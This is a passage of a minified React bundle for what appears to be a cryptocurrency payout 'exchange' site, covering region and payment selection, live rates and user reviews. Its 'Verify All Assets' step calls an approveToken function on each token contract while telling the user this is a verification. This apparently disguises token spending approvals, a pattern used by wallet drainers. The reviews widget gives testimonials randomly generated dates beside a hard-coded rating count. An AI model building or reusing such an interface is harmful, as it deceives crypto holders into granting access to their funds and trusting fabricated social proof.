                className: `bg-gradient-to-r ${s ? "from-blue-900/20 to-purple-900/20" : "from-blue-50 to-purple-50"} rounded-2xl p-6 mb-6 border ${s ? "border-blue-800" : "border-blue-100"}`,
                children: [a.jsxs("h4", {
                    className: `font-semibold ${s ? "text-blue-300" : "text-blue-900"} mb-3 flex items-center`,
                    children: [a.jsx(Me, {
                        className: "w-5 h-5 mr-2"
                    }), "Available Payment Methods"]
                }), a.jsx("div", {
                    className: "grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm",
                    children: m == null ? void 0 : m.methods.map( (p, f) => a.jsxs("div", {
                        className: `flex items-center justify-between ${r.cardBg} rounded-xl p-3 border ${s ? "border-blue-700" : "border-blue-100"}`,
                        children: [a.jsxs("div", {
                            className: "flex items-center",
                            children: [a.jsx(qr, {
                                className: "w-4 h-4 text-blue-600 mr-2"
                            }), a.jsx("span", {
                                className: `font-medium ${r.text}`,
                                children: p.name
                            })]
                        }), a.jsxs("div", {
                            className: "flex items-center space-x-2",
                            children: [a.jsxs("span", {
                                className: r.textSecondary,
                                children: ["Fee: ", p.fee]
                            }), a.jsx("span", {
                                className: "bg-green-100 text-green-800 px-2 py-1 rounded-full text-xs font-medium",
                                children: "INSTANT"
                            })]
                        })]
                    }, f))
                })]
            }), a.jsx("h4", {
                className: `text-lg font-semibold ${r.text} mb-4`,
                children: "Choose Payment Method"
            }), a.jsx("div", {
                className: "space-y-3 mb-6",
                children: m == null ? void 0 : m.methods.map( (p, f) => a.jsxs("button", {
                    onClick: () => {
                        o(p.name),
                        l({})
                    }
                    ,
                    className: `w-full border-2 rounded-2xl p-4 hover:border-blue-500 ${r.hover} flex items-center justify-between transition-all duration-300 ${t === p.name ? "border-blue-600 bg-blue-50" : `${r.border} ${r.cardBg}`}`,
                    children: [a.jsxs("div", {
                        className: "flex items-center",
                        children: [a.jsx(qr, {
                            className: "w-6 h-6 text-blue-600 mr-3"
                        }), a.jsxs("div", {
                            className: "text-left",
                            children: [a.jsx("div", {
                                className: `font-semibold ${r.text}`,
                                children: p.name
                            }), a.jsxs("div", {
                                className: `text-sm ${r.textSecondary}`,
                                children: ["Fee: ", p.fee]
                            })]
                        })]
                    }), a.jsx("div", {
                        className: "flex items-center space-x-2",
                        children: a.jsx("span", {
                            className: "bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-medium",
                            children: "INSTANT"
                        })
                    })]
                }, f))
            })]
        }) : a.jsxs(a.Fragment, {
            children: [a.jsxs("h3", {
                className: `text-xl font-semibold ${r.text} mb-6 flex items-center`,
                children: [a.jsx(Me, {
                    className: "w-6 h-6 mr-2 text-blue-600"
                }), "Select Your Payout Region"]
            }), a.jsx("div", {
                className: `${s ? "bg-blue-900/20" : "bg-blue-50"} border ${s ? "border-blue-800" : "border-blue-200"} rounded-2xl p-4 mb-6`,
                children: a.jsx("p", {
                    className: `text-sm ${s ? "text-blue-300" : "text-blue-800"} mb-2`,
                    children: "Please choose your payout region from the following options:"
                })
            }), [{
                name: "High Demand Region",
                countries: ta.filter(p => p.region === "High Demand Region")
            }, {
                name: "European ",
                countries: ta.filter(p => p.region === "European Countries")
            }, {
                name: " Asian ",
                countries: ta.filter(p => p.region === "Major Asian Countries")
            }, {
                name: "Western ",
                countries: ta.filter(p => p.region === "Western Countries")
            }].map(p => {
                const f = p.name
                  , d = p.countries
                  , g = f === "High Demand Region";
                return a.jsxs("div", {
                    className: "mb-8",
                    children: [g && a.jsx("div", {
                        className: `${s ? "bg-blue-900/10" : "bg-blue-50"} border ${s ? "border-blue-800/30" : "border-blue-200"} rounded-2xl p-6 mb-6`,
                        children: a.jsxs("div", {
                            className: "text-center",
                            children: [a.jsxs("div", {
                                className: "flex items-center justify-center mb-4",
                                children: [a.jsx("div", {
                                    className: `w-12 h-12 bg-gradient-to-r ${r.gradient} rounded-xl flex items-center justify-center shadow-lg mr-3`,
                                    children: a.jsx(Me, {
                                        className: "w-6 h-6 text-white"
                                    })
                                }), a.jsxs("div", {
                                    children: [a.jsx("h4", {
                                        className: `text-xl font-bold ${r.text}`,
                                        children: "Most Popular Regions"
                                    }), a.jsx("p", {
                                        className: `text-sm ${r.textSecondary}`,
                                        children: "Fastest processing & lowest fees"
                                    })]
                                })]
                            }), a.jsxs("div", {
                                className: "grid grid-cols-3 gap-4 max-w-lg mx-auto",
                                children: [a.jsxs("div", {
                                    className: `${r.cardBg} rounded-xl p-3 border ${r.border}`,
                                    children: [a.jsx("div", {
                                        className: "text-lg font-bold text-green-600",
                                        children: "0-1%"
                                    }), a.jsx("div", {
                                        className: `text-xs ${r.textSecondary}`,
                                        children: "Low Fees"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${r.cardBg} rounded-xl p-3 border ${r.border}`,
                                    children: [a.jsx("div", {
                                        className: "text-lg font-bold text-blue-600",
                                        children: "24/7"
                                    }), a.jsx("div", {
                                        className: `text-xs ${r.textSecondary}`,
                                        children: "Processing"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${r.cardBg} rounded-xl p-3 border ${r.border}`,
                                    children: [a.jsx("div", {
                                        className: "text-lg font-bold text-orange-600",
                                        children: "3min"
                                    }), a.jsx("div", {
                                        className: `text-xs ${r.textSecondary}`,
                                        children: "Settlement"
                                    })]
                                })]
                            })]
                        })
                    }), !g && a.jsxs("h4", {
                        className: `text-lg font-bold ${r.text} mb-4 flex items-center`,
                        children: [a.jsx("div", {
                            className: `w-3 h-3 bg-gradient-to-r ${r.gradient} rounded-full mr-3`
                        }), f]
                    }), a.jsx("div", {
                        className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4",
                        children: d.map(S => a.jsxs("button", {
                            onClick: () => {
                                i(S.code),
                                x(!0),
                                o(""),
                                l({})
                            }
                            ,
                            className: `border-2 rounded-xl p-4 transition-all duration-200 text-left group ${g ? `${s ? "bg-blue-900/20 border-blue-700/50 hover:border-blue-500" : "bg-blue-50 border-blue-200 hover:border-blue-400"} hover:shadow-lg` : `${r.border} ${r.cardBg} hover:border-blue-400 ${r.hover} hover:shadow-md`}`,
                            children: [a.jsxs("div", {
                                className: "flex items-center space-x-3",
                                children: [a.jsx("div", {
                                    className: "text-2xl group-hover:scale-110 transition-transform duration-200",
                                    children: S.flag
                                }), a.jsxs("div", {
                                    className: "flex-1 min-w-0",
                                    children: [a.jsx("div", {
                                        className: `font-semibold text-base mb-1 ${r.text} truncate`,
                                        children: S.name
                                    }), a.jsxs("div", {
                                        className: `text-sm ${r.textSecondary} mb-2`,
                                        children: [S.methods.length, " method", S.methods.length > 1 ? "s" : ""]
                                    }), a.jsxs("div", {
                                        className: "flex items-center",
                                        children: [a.jsx(Ot, {
                                            className: "w-3 h-3 mr-1 text-green-600"
                                        }), a.jsx("span", {
                                            className: "text-xs font-medium text-green-600",
                                            children: g ? "PRIORITY" : "INSTANT"
                                        })]
                                    })]
                                })]
                            }), g && a.jsx("div", {
                                className: "mt-3 text-center",
                                children: a.jsx("span", {
                                    className: "bg-blue-100 text-blue-800 px-2 py-1 rounded-full text-xs font-medium",
                                    children: "Popular"
                                })
                            })]
                        }, S.code))
                    })]
                }, f)
            }
            ), a.jsx("div", {
                className: `mt-8 ${s ? "bg-gray-800/50" : "bg-gray-50"} border ${r.border} rounded-2xl p-6`,
                children: a.jsxs("div", {
                    className: "text-center",
                    children: [a.jsx("div", {
                        className: `w-12 h-12 bg-gradient-to-r ${r.gradient} rounded-xl flex items-center justify-center mx-auto mb-4 shadow-lg`,
                        children: a.jsx(Me, {
                            className: "w-6 h-6 text-white"
                        })
                    }), a.jsx("h5", {
                        className: `font-bold text-lg mb-3 ${r.text}`,
                        children: "Country Not Listed?"
                    }), a.jsx("p", {
                        className: `${r.textSecondary} mb-4 max-w-md mx-auto`,
                        children: "Contact our support team for assistance with payout options in your region."
                    }), a.jsxs("div", {
                        className: "flex items-center justify-center space-x-6 text-sm",
                        children: [a.jsxs("div", {
                            className: "flex items-center",
                            children: [a.jsx("div", {
                                className: "w-2 h-2 bg-green-500 rounded-full mr-2"
                            }), a.jsx("span", {
                                className: r.textSecondary,
                                children: "10+ Countries"
                            })]
                        }), a.jsxs("div", {
                            className: "flex items-center",
                            children: [a.jsx("div", {
                                className: "w-2 h-2 bg-blue-500 rounded-full mr-2"
                            }), a.jsx("span", {
                                className: r.textSecondary,
                                children: "24/7 Support"
                            })]
                        })]
                    })]
                })
            })]
        }), t && a.jsx(Lf, {
            selectedPaymentMethod: t,
            paymentDetails: n,
            setPaymentDetails: l,
            themeClasses: r
        }), t && a.jsx("button", {
            onClick: () => u(4),
            disabled: !e || !t || !c(t, n),
            className: `w-full bg-gradient-to-r ${r.gradient} text-white py-3 rounded-2xl font-semibold hover:shadow-xl disabled:opacity-50 transition-all duration-300`,
            children: "Next: Asset Verification"
        })]
    })
}
  , Bc = ({tokens: e, showApprovalAnimation: t, approvalInProgress: n, darkMode: r, themeClasses: s, approveToken: i, setCurrentStep: o}) => a.jsxs("div", {
    children: [a.jsxs("div", {
        className: "flex items-center justify-between mb-6",
        children: [a.jsx("h3", {
            className: `text-xl font-semibold ${s.text}`,
            children: "Verify All Assets"
        }), a.jsxs("div", {
            className: `text-sm ${s.textSecondary}`,
            children: [e.filter(l => l.approved).length, " of ", e.length, " verified"]
        })]
    }), a.jsx("div", {
        className: `mb-6 ${r ? "bg-blue-900/20" : "bg-blue-50"} border ${r ? "border-blue-800" : "border-blue-200"} rounded-2xl p-4`,
        children: a.jsxs("div", {
            className: `flex items-center ${r ? "text-blue-300" : "text-blue-800"}`,
            children: [a.jsx(Gs, {
                className: "w-5 h-5 mr-2"
            }), a.jsx("span", {
                className: "text-sm font-medium",
                children: "All assets must be verified before proceeding with your order"
            })]
        })
    }), a.jsx("div", {
        className: "space-y-3",
        children: e.map( (l, u) => {
            var c, m;
            return a.jsx("div", {
                className: `${s.cardBg} rounded-2xl p-4 ${s.hover} transition-all duration-300 ${s.border} border ${t === l.symbol ? "ring-4 ring-green-300 ring-opacity-50 scale-105" : ""}`,
                children: a.jsxs("div", {
                    className: "flex items-center justify-between",
                    children: [a.jsxs("div", {
                        className: "flex items-center space-x-4",
                        children: [a.jsx("div", {
                            className: `w-12 h-12 bg-gradient-to-r ${s.gradient} rounded-2xl flex items-center justify-center text-white font-bold shadow-lg`,
                            children: (c = l.symbol) == null ? void 0 : c.charAt(0)
                        }), a.jsxs("div", {
                            children: [a.jsx("div", {
                                className: `font-semibold ${s.text}`,
                                children: l.name
                            }), a.jsxs("div", {
                                className: `text-sm ${s.textSecondary}`,
                                children: [l.balance, " ", l.symbol, " • ", l.value]
                            }), a.jsxs("div", {
                                className: `text-xs ${s.textSecondary} font-mono`,
                                children: [(m = l.contractAddress) == null ? void 0 : m.slice(0, 10), "..."]
                            })]
                        })]
                    }), a.jsx("div", {
                        className: "flex items-center",
                        children: l.approved ? a.jsxs("div", {
                            className: `flex items-center text-green-600 ${r ? "bg-green-900/20" : "bg-green-50"} px-3 py-2 rounded-xl transition-all duration-500 ${t === l.symbol ? "animate-pulse" : ""}`,
                            children: [a.jsx(tt, {
                                className: "w-4 h-4 mr-2"
                            }), a.jsx("span", {
                                className: "text-sm font-medium",
                                children: "Verified"
                            }), t === l.symbol && a.jsx(Gs, {
                                className: "w-4 h-4 ml-2 text-green-600 animate-bounce"
                            })]
                        }) : a.jsx("button", {
                            onClick: () => i(l),
                            disabled: n === l.symbol,
                            className: `bg-gradient-to-r ${s.gradient} text-white px-4 py-2 rounded-xl text-sm font-medium hover:shadow-lg disabled:opacity-50 flex items-center transition-all duration-300`,
                            children: n === l.symbol ? a.jsxs(a.Fragment, {
                                children: [a.jsx(wr, {
                                    className: "w-4 h-4 mr-2 animate-spin"
                                }), "Verifying..."]
                            }) : a.jsxs(a.Fragment, {
                                children: [a.jsx(Gs, {
                                    className: "w-4 h-4 mr-2"
                                }), "Verify Asset"]
                            })
                        })
                    })]
                })
            }, l.contractAddress)
        }
        )
    }), e.every(l => l.approved) && a.jsxs("div", {
        className: `mt-6 ${r ? "bg-green-900/20" : "bg-green-50"} border ${r ? "border-green-700" : "border-green-200"} rounded-2xl p-4`,
        children: [a.jsxs("div", {
            className: `flex items-center ${r ? "text-green-300" : "text-green-800"} mb-2`,
            children: [a.jsx(tt, {
                className: "w-5 h-5 mr-2"
            }), a.jsx("span", {
                className: "font-medium",
                children: "All assets verified successfully!"
            })]
        }), a.jsx("p", {
            className: `text-sm ${r ? "text-green-400" : "text-green-700"}`,
            children: "You can now proceed to confirm your order."
        })]
    }), a.jsx("button", {
        onClick: () => o(5),
        disabled: !e.every(l => l.approved),
        className: `w-full bg-gradient-to-r ${s.gradient} text-white py-3 rounded-2xl font-semibold hover:shadow-xl disabled:opacity-50 mt-6 transition-all duration-300`,
        children: e.every(l => l.approved) ? "Proceed to Order Confirmation" : `Verify ${e.filter(l => !l.approved).length} More Asset${e.filter(l => !l.approved).length > 1 ? "s" : ""}`
    })]
})
  , Tc = ({exchangeRates: e, showRates: t, setShowRates: n, selectedFiat: r, setSelectedFiat: s, darkMode: i, themeClasses: o}) => {
    const [l,u] = E.useState([])
      , [c,m] = E.useState(new Date)
      , [h,x] = E.useState(!1)
      , [y,v] = E.useState(null)
      , [k,p] = E.useState({})
      , [f,d] = E.useState({})
      , g = [{
        id: "bitcoin",
        symbol: "BTC",
        name: "Bitcoin",
        markup: 5,
        icon: "₿",
        volume: "$5.2M"
    }, {
        id: "ethereum",
        symbol: "ETH",
        name: "Ethereum",
        markup: 5,
        icon: "Ξ",
        volume: "$2.8M"
    }, {
        id: "tether",
        symbol: "USDT",
        name: "Tether",
        markup: 10,
        icon: "₮",
        volume: "$3.5M"
    }, {
        id: "usd-coin",
        symbol: "USDC",
        name: "USD Coin",
        markup: 10,
        icon: "$",
        volume: "$1.9M"
    }, {
        id: "binancecoin",
        symbol: "BNB",
        name: "BNB",
        markup: 5,
        icon: "⬡",
        volume: "$1.2M"
    }]
      , S = (N, P) => `${N}_${P.toLowerCase()}`
      , w = r.toLowerCase()
      , j = async () => {
        x(!0),
        v(null);
        const N = g.map(U => U.id).join(",")
          , P = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=${encodeURIComponent(w)}&ids=${encodeURIComponent(N)}&price_change_percentage=24h`
          , M = async U => {
            const D = await fetch(U, {
                headers: {
                    Accept: "application/json"
                }
            });
            if (!D.ok)
                throw new Error(`HTTP ${D.status}`);
            return D.json()
        }
        ;
        try {
            let U = null;
            try {
                U = await M(P)
            } catch {
                const F = await fetch("https://api.allorigins.win/get?url=" + encodeURIComponent(P));
                if (!F.ok)
                    throw new Error(`Proxy HTTP ${F.status}`);
                const T = await F.json();
                U = JSON.parse(T.contents)
            }
            if (!Array.isArray(U) || U.length === 0)
                throw new Error("Empty market data");
            const D = {};
            for (const O of U)
                O != null && O.id && (D[O.id] = O);
            const A = g.map(O => {
                const W = D[O.id] || {}
                  , F = Number(W.current_price) || 0
                  , T = Number(W.high_24h) || 0;
                let $ = F > 0 ? F : T > 0 ? T : 0;
                if (!($ > 0)) {
                    const Q = S(O.symbol, w);
                    $ = (f[Q] ?? 0) || (k[Q] ?? 0) || Dn(O.symbol, w)
                }
                const z = S(O.symbol, w);
                F > 0 && p(Q => ({
                    ...Q,
                    [z]: F
                })),
                T > 0 && d(Q => ({
                    ...Q,
                    [z]: T
                }));
                let L = 0;
                typeof W.price_change_percentage_24h_in_currency == "number" ? L = W.price_change_percentage_24h_in_currency : typeof W.price_change_percentage_24h == "number" && (L = W.price_change_percentage_24h);
                const G = $ * (1 + O.markup / 100);
                return {
                    symbol: O.symbol,
                    name: O.name,
                    marketPrice: $,
                    exchangePrice: G,
                    markup: O.markup,
                    change24h: L,
                    volume: O.volume,
                    icon: O.icon
                }
            }
            );
            u(A),
            m(new Date),
            v(null)
        } catch (U) {
            console.error("Failed to fetch live rates:", U),
            v((U == null ? void 0 : U.message) || "Failed to fetch live rates");
            const D = g.map(A => {
                const O = S(A.symbol, w)
                  , W = (f[O] ?? 0) || (k[O] ?? 0) || Dn(A.symbol)
                  , F = W * (1 + A.markup / 100);
                return {
                    symbol: A.symbol,
                    name: A.name,
                    marketPrice: W,
                    exchangePrice: F,
                    markup: A.markup,
                    change24h: 0,
                    volume: A.volume,
                    icon: A.icon
                }
            }
            );
            u(D),
            m(new Date)
        } finally {
            x(!1)
        }
    }
    ;
    E.useEffect( () => {
        j();
        const N = setInterval(j, 3e4);
        return () => clearInterval(N)
    }
    , [r]);
    const B = N => N < 1 ? N.toFixed(4) : N < 100 ? N.toFixed(2) : N.toLocaleString(void 0, {
        maximumFractionDigits: 0
    })
      , b = () => ({
        usd: "$",
        eur: "€",
        inr: "₹",
        gbp: "£"
    })[w] || "$";
    return a.jsxs("div", {
        className: `${o.cardBg} rounded-xl sm:rounded-2xl ${o.border} border overflow-hidden shadow-2xl backdrop-blur-xl`,
        children: [a.jsx("div", {
            className: `bg-gradient-to-r ${i ? "from-blue-900/20 to-cyan-900/20" : "from-blue-50 to-cyan-50"} p-4 sm:p-6 border-b ${o.border}`,
            children: a.jsxs("div", {
                className: "flex items-center justify-between",
                children: [a.jsxs("div", {
                    className: "flex items-center space-x-3",
                    children: [a.jsx("div", {
                        className: `w-10 h-10 sm:w-12 sm:h-12 bg-gradient-to-r ${o.gradient} rounded-xl flex items-center justify-center shadow-xl`,
                        children: a.jsx(gc, {
                            className: "w-5 h-5 sm:w-6 sm:h-6 text-white"
                        })
                    }), a.jsxs("div", {
                        children: [a.jsxs("div", {
                            className: "flex items-center space-x-2",
                            children: [a.jsx("span", {
                                className: `font-bold ${o.text} text-lg sm:text-xl`,
                                children: "Live Exchange Rates"
                            }), a.jsxs("div", {
                                className: "flex items-center space-x-1",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-green-500 rounded-full animate-pulse"
                                }), a.jsx("span", {
                                    className: "text-xs bg-green-500/20 text-green-400 px-1.5 sm:px-2 py-1 rounded-full font-medium",
                                    children: "LIVE"
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: `text-xs ${o.textSecondary} flex flex-wrap items-center gap-1 sm:gap-2`,
                            children: [a.jsxs("span", {
                                children: ["Updated: ", c.toLocaleTimeString()]
                            }), y && a.jsxs("span", {
                                className: "text-orange-500 flex items-center whitespace-nowrap",
                                children: [a.jsx(Qt, {
                                    className: "w-3 h-3 mr-1"
                                }), a.jsx("span", {
                                    className: "hidden sm:inline",
                                    children: "Using fallback data"
                                }), a.jsx("span", {
                                    className: "sm:hidden",
                                    children: "Fallback"
                                })]
                            }), a.jsxs("button", {
                                onClick: j,
                                disabled: h,
                                className: "flex items-center space-x-1 hover:text-blue-600 transition-colors whitespace-nowrap",
                                children: [a.jsx(ff, {
                                    className: `w-3 h-3 ${h ? "animate-spin" : ""}`
                                }), a.jsx("span", {
                                    children: "Refresh"
                                })]
                            })]
                        })]
                    })]
                }), a.jsx("button", {
                    onClick: () => n(!t),
                    className: `p-2 sm:p-3 rounded-lg sm:rounded-xl ${o.hover} transition-all duration-200 border ${o.border}`,
                    children: t ? a.jsx(Ho, {
                        className: `w-5 h-5 ${o.text}`
                    }) : a.jsx(lf, {
                        className: `w-5 h-5 ${o.text}`
                    })
                })]
            })
        }), t && a.jsxs("div", {
            className: "p-4 sm:p-6 space-y-4 sm:space-y-6",
            children: [a.jsxs("div", {
                className: "space-y-4",
                children: [a.jsxs("span", {
                    className: `text-sm font-medium ${o.text} flex items-center gap-2`,
                    children: [a.jsx(Me, {
                        className: "w-4 h-4 text-blue-500"
                    }), "Base Currency"]
                }), a.jsx("div", {
                    className: "grid grid-cols-4 gap-1 sm:gap-3",
                    children: [{
                        code: "usd",
                        symbol: "$",
                        name: "USD",
                        flag: "🇺🇸"
                    }, {
                        code: "eur",
                        symbol: "€",
                        name: "EUR",
                        flag: "🇪🇺"
                    }, {
                        code: "inr",
                        symbol: "₹",
                        name: "INR",
                        flag: "🇮🇳"
                    }, {
                        code: "gbp",
                        symbol: "£",
                        name: "GBP",
                        flag: "🇬🇧"
                    }].map(N => a.jsxs("button", {
                        onClick: () => s(N.code),
                        className: `relative overflow-hidden rounded-lg sm:rounded-xl p-3 sm:p-4 text-center transition-all duration-300 border-2 ${r === N.code ? `border-blue-500 ${i ? "bg-blue-900/20" : "bg-blue-50"} shadow-xl scale-105` : `${o.border} ${o.cardBg} hover:border-blue-300 hover:shadow-md`}`,
                        children: [r === N.code && a.jsx("div", {
                            className: "absolute inset-0 bg-gradient-to-r from-blue-500/10 to-purple-500/10"
                        }), a.jsxs("div", {
                            className: "relative",
                            children: [a.jsx("div", {
                                className: "text-base sm:text-xl mb-1 sm:mb-2",
                                children: N.flag
                            }), a.jsx("div", {
                                className: `text-xs sm:text-sm font-bold ${r === N.code ? "text-blue-600" : o.text}`,
                                children: N.name
                            }), a.jsx("div", {
                                className: `text-xs hidden sm:block ${r === N.code ? "text-blue-500" : o.textSecondary}`,
                                children: N.symbol
                            })]
                        }), r === N.code && a.jsx("div", {
                            className: "absolute top-0.5 right-0.5 sm:top-1 sm:right-1",
                            children: a.jsx(tt, {
                                className: "w-3 h-3 text-blue-500"
                            })
                        })]
                    }, N.code))
                })]
            }), a.jsx("div", {
                className: "space-y-2 sm:space-y-4",
                children: l.map(N => a.jsxs("div", {
                    className: `relative overflow-hidden rounded-lg border ${o.border} ${o.cardBg} hover:border-blue-400 transition-all duration-300 group hover:shadow-xl backdrop-blur-sm`,
                    children: [a.jsx("div", {
                        className: `absolute inset-0 bg-gradient-to-r ${N.change24h >= 0 ? "from-green-500/5 to-emerald-500/5" : "from-red-500/5 to-pink-500/5"} opacity-0 group-hover:opacity-100 transition-opacity duration-300`
                    }), a.jsx("div", {
                        className: "relative p-3 sm:p-6",
                        children: a.jsxs("div", {
                            className: "flex items-center justify-between gap-2 sm:gap-3",
                            children: [a.jsxs("div", {
                                className: "flex items-center space-x-2 min-w-0",
                                children: [a.jsx("div", {
                                    className: `w-10 h-10 sm:w-14 sm:h-14 bg-gradient-to-r ${o.gradient} rounded-lg sm:rounded-xl flex items-center justify-center text-white font-bold text-sm sm:text-xl shadow-xl group-hover:scale-110 transition-transform duration-300 flex-shrink-0`,
                                    children: N.icon
                                }), a.jsxs("div", {
                                    className: "min-w-0",
                                    children: [a.jsxs("div", {
                                        className: "flex items-center space-x-2",
                                        children: [a.jsx("span", {
                                            className: `font-bold ${o.text} text-base sm:text-xl`,
                                            children: N.symbol
                                        }), a.jsx("span", {
                                            className: `text-sm ${o.textSecondary} hidden sm:inline truncate`,
                                            children: N.name
                                        })]
                                    }), a.jsx("div", {
                                        className: "flex items-center text-xs",
                                        children: a.jsxs("div", {
                                            className: `flex items-center space-x-1 ${N.change24h >= 0 ? "text-green-600" : "text-red-600"}`,
                                            children: [a.jsx(Ra, {
                                                className: `w-3 h-3 ${N.change24h < 0 ? "rotate-180" : ""}`
                                            }), a.jsxs("span", {
                                                className: "font-medium",
                                                children: [N.change24h >= 0 ? "+" : "", N.change24h.toFixed(2), "%"]
                                            })]
                                        })
                                    })]
                                })]
                            }), a.jsxs("div", {
                                className: "text-right space-y-1 flex-shrink-0",
                                children: [a.jsxs("div", {
                                    className: "space-y-1",
                                    children: [a.jsxs("div", {
                                        className: `text-xs ${o.textSecondary} flex items-center justify-end space-x-1`,
                                        children: [a.jsx(Tn, {
                                            className: "w-3 h-3"
                                        }), a.jsx("span", {
                                            children: "Market Price"
                                        })]
                                    }), a.jsxs("div", {
                                        className: `font-bold ${o.text} text-sm sm:text-lg`,
                                        children: [b(), B(N.marketPrice)]
                                    })]
                                }), a.jsxs("div", {
                                    className: "space-y-1",
                                    children: [a.jsxs("div", {
                                        className: "flex items-center justify-end space-x-1 text-xs",
                                        children: [a.jsx(Ot, {
                                            className: "w-3 h-3 text-orange-500"
                                        }), a.jsxs("span", {
                                            className: "text-orange-600 font-medium whitespace-nowrap",
                                            children: ["Exchange Rate +", N.markup, "%"]
                                        })]
                                    }), a.jsxs("div", {
                                        className: "font-bold text-base sm:text-xl text-blue-600",
                                        children: [b(), B(N.exchangePrice)]
                                    })]
                                }), a.jsxs("div", {
                                    className: `text-xs ${o.textSecondary} ${i ? "bg-orange-900/20" : "bg-orange-100"} px-1 sm:px-2 py-0.5 sm:py-1 rounded text-center`,
                                    children: [a.jsx("span", {
                                        className: "hidden sm:inline",
                                        children: "Your Profit: "
                                    }), b(), B(N.exchangePrice - N.marketPrice)]
                                })]
                            })]
                        })
                    })]
                }, N.symbol))
            }), a.jsx("div", {
                className: `mt-4 sm:mt-6 p-3 sm:p-4 rounded-xl ${i ? "bg-blue-900/10 border-blue-800/30" : "bg-blue-50 border-blue-200"} border text-center backdrop-blur-sm`,
                children: a.jsxs("div", {
                    className: `text-xs ${i ? "text-blue-300" : "text-blue-800"} space-y-1`,
                    children: [a.jsxs("div", {
                        className: "flex items-center justify-center space-x-1",
                        children: [a.jsx(gc, {
                            className: "w-3 h-3"
                        }), a.jsx("span", {
                            className: "font-medium",
                            children: "Real-time pricing with transparent markup"
                        })]
                    }), a.jsx("div", {
                        className: "text-xs",
                        children: y ? a.jsx("span", {
                            className: "text-orange-600",
                            children: "Using cached 24h highs / last known rates • API temporarily unavailable"
                        }) : a.jsxs(a.Fragment, {
                            children: [a.jsx("span", {
                                className: "hidden sm:inline",
                                children: "Market rates update every 30 seconds • Exchange rates include processing fees"
                            }), a.jsx("span", {
                                className: "sm:hidden",
                                children: "Updates every 30s • Includes fees"
                            })]
                        })
                    })]
                })
            })]
        })]
    })
}
  , Of = ({testimonials: e, darkMode: t, themeClasses: n}) => {
    const [r,s] = E.useState(0)
      , [i,o] = E.useState(!0)
      , [l,u] = E.useState([]);
    E.useEffect( () => {
        const h = () => {
            const y = new Date
              , v = Math.random() < .3;
            let k;
            if (v) {
                const g = new Date(y.getTime() - 864e6);
                k = g.getTime() + Math.random() * (y.getTime() - g.getTime())
            } else {
                const g = new Date(y.getTime() - 9504e5)
                  , S = new Date(y.getFullYear() - 2,y.getMonth(),y.getDate());
                k = S.getTime() + Math.random() * (g.getTime() - S.getTime())
            }
            const p = new Date(k)
              , f = y.getTime() - p.getTime()
              , d = Math.floor(f / (1e3 * 3600 * 24));
            return d === 0 ? "Today" : d === 1 ? "1 day ago" : d < 7 ? `${d} days ago` : d < 14 ? "1 week ago" : d < 30 ? `${Math.floor(d / 7)} weeks ago` : d < 60 ? "1 month ago" : d < 365 ? `${Math.floor(d / 30)} months ago` : d < 730 ? "1 year ago" : `${Math.floor(d / 365)} years ago`
        }
          , x = e.map( () => h());
        u(x)
    }
    , [e]),
    E.useEffect( () => {
        if (!i)
            return;
        const h = setInterval( () => {
            s(x => (x + 1) % e.length)
        }
        , 4e3);
        return () => clearInterval(h)
    }
    , [e.length, i]);
    const c = h => {
        s(h),
        o(!1)
    }
      , m = e[r];
    return a.jsxs("div", {
        className: `relative overflow-hidden ${n.cardBg} border ${n.border} rounded-xl sm:rounded-2xl shadow-2xl backdrop-blur-xl`,
        children: [a.jsxs("div", {
            className: "absolute inset-0 overflow-hidden",
            children: [a.jsx("div", {
                className: "absolute -top-10 -right-10 w-32 h-32 bg-gradient-to-br from-blue-400/10 to-cyan-400/10 rounded-full blur-3xl animate-pulse"
            }), a.jsx("div", {
                className: "absolute -bottom-10 -left-10 w-40 h-40 bg-gradient-to-br from-purple-400/10 to-pink-400/10 rounded-full blur-3xl animate-pulse delay-1000"
            })]
        }), a.jsxs("div", {
            className: "relative z-10 p-4 sm:p-6 pb-3 sm:pb-4",
            children: [a.jsx("div", {
                className: "flex items-center justify-between mb-4 sm:mb-6",
                children: a.jsxs("div", {
                    className: "flex items-center gap-3",
                    children: [a.jsx("div", {
                        className: `w-10 h-10 sm:w-12 sm:h-12 bg-gradient-to-r ${n.gradient} rounded-xl flex items-center justify-center shadow-xl`,
                        children: a.jsx(ir, {
                            className: "w-5 h-5 sm:w-6 sm:h-6 text-white"
                        })
                    }), a.jsxs("div", {
                        children: [a.jsxs("h3", {
                            className: `text-lg sm:text-xl font-bold ${n.text} flex items-center gap-2`,
                            children: ["User Reviews", a.jsx(Hs, {
                                className: "w-4 h-4 sm:w-5 sm:h-5 text-blue-500"
                            })]
                        }), a.jsxs("div", {
                            className: "flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-2 text-xs sm:text-sm",
                            children: [a.jsx("div", {
                                className: "flex items-center",
                                children: [...Array(5)].map( (h, x) => a.jsx(ir, {
                                    className: "w-3 h-3 sm:w-4 sm:h-4 text-yellow-400 fill-current"
                                }, x))
                            }), a.jsx("span", {
                                className: `${n.textSecondary} font-medium whitespace-nowrap`,
                                children: "4.8/5 • 12,847 reviews"
                            })]
                        })]
                    })]
                })
            }), a.jsx("div", {
                className: "relative",
                children: a.jsxs("div", {
                    className: `${n.cardBg} backdrop-blur-sm rounded-xl p-4 sm:p-6 border ${n.border} shadow-xl transition-all duration-500 transform`,
                    children: [a.jsx("div", {
                        className: "absolute -top-2 -left-2 sm:-top-3 sm:-left-3",
                        children: a.jsx("div", {
                            className: `w-6 h-6 sm:w-8 sm:h-8 bg-gradient-to-r ${n.gradient} rounded-lg sm:rounded-xl flex items-center justify-center shadow-lg`,
                            children: a.jsx(pf, {
                                className: "w-4 h-4 text-white"
                            })
                        })
                    }), a.jsxs("div", {
                        className: "flex items-start gap-3 sm:gap-4 mb-4",
                        children: [a.jsxs("div", {
                            className: "relative",
                            children: [a.jsx("div", {
                                className: `w-12 h-12 sm:w-16 sm:h-16 rounded-lg sm:rounded-xl bg-gradient-to-br ${n.gradient} flex items-center justify-center text-white text-lg sm:text-xl font-bold shadow-lg`,
                                children: m.name.split(" ").map(h => h[0]).join("").toUpperCase()
                            }), a.jsx("div", {
